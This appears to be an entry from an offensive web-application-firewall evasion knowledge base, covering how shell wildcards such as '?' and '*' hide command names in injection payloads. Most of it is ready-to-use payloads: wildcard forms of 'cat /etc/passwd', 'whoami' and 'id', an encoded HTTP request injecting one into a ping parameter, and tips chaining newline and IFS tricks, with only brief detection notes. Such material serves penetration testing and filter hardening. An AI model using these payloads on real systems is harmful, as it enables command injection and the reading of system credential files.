---
id: WAF-EVASION-08
title: Wildcard Obfuscation
category: Evasion Techniques
severity_range: Medium-High
owasp_ref: https://github.com/0xInfection/Awesome-WAF
---

# WAF-EVASION-08: Wildcard Obfuscation

## Summary

Wildcard obfuscation leverages shell globbing patterns (e.g., `?`, `*`, `[]`) to bypass WAF filters that match against literal command names or file paths. Since the shell expands wildcards before executing commands, the WAF sees a benign or non-matching pattern while the shell executes the intended command.

## When to Use

- Against WAFs that block specific command names like `cat`, `id`, `whoami`
- For command injection payloads where the WAF uses string matching on the command string
- When the target application passes user input through a shell command (system, exec, popen)
- Against WAFs that don't simulate shell expansion before pattern matching

## Technique Details

**Shell wildcards overview:**

| Wildcard | Meaning | Example |
|----------|---------|---------|
| `?` | Matches any single character | `/???/??t` → `/bin/cat` |
| `*` | Matches any sequence of characters | `/b*/c*` → `/bin/cat` |
| `[abc]` | Matches any character in set | `/[cb]at` → `/cat` or `/bat` |
| `[!abc]` | Matches any character not in set | `/c[!x]t` → `/cat` |

The technique exploits the fact that the WAF examines the literal command string while the shell expands wildcards to match actual filesystems.

## Payload Examples

```bash
# Linux wildcard obfuscation
# cat /etc/passwd
/bin/??? /???/??ss??

# /usr/bin/id
/???/???/?? /???/???/??    # Could match /usr/bin/id /usr/bin/id

# Reading files by pattern
/???/c?t /???/p?ss??       # cat /etc/passwd (alternative)

# Multi-character wildcards
/usr/bin/cat /e*/p*d
/???/???/c*t /???/*ss*

# Using character class
/bin/c[!x]t /etc/passwd

# Combine with other tricks
/???/c?t${IFS}/???/??ss??  # wildcard + IFS bypass

# Windows wildcard obfuscation
# Windows cmd does not support ? and * in the same way, but PowerShell does
Get-Content C:\*i*d*\*y*s*m*
# type C:\*i*d*\*y*s*m*  (cmd with limited wildcards)

# Bypass blocked commands like 'whoami'
/???/???/??o??i              # could match /usr/bin/whoami
```

```http
# HTTP request with wildcard command injection
GET /ping?ip=127.0.0.1%20%2F???%2Fc%3Ft%20%2F???%2Fp%3Fss%3F%3F HTTP/1.1
Host: target.com
# Decoded: 127.0.0.1 /???/c?t /???/p?ss??
```

## Detection & Bypass Notes

**Detection:**
- WAFs that simulate glob expansion by enumerating available filesystems can match the expanded command.
- Behavioral WAFs that monitor command execution on the server can detect wildcard-based attacks.
- Sandboxing commands or using allowlist-based command execution prevents wildcard exploitation.

**Bypass:**
- Combine with other bypasses: `%0a/???/c?t${IFS}/???/??ss??` (newline injection + wildcards + IFS).
- Use recursive wildcards (`**`) on systems that support them (bash 4+, zsh).
- On Windows, use PowerShell's `Get-ChildItem` with wildcards or old 8.3 filename patterns (`C:\progra~1\`).
- Ensure the expanded path is unambiguous — test with multiple wildcard patterns to handle different system configurations.

## References

- https://github.com/0xInfection/Awesome-WAF
- https://linux.die.net/man/7/glob
- https://owasp.org/www-community/attacks/Command_Injection
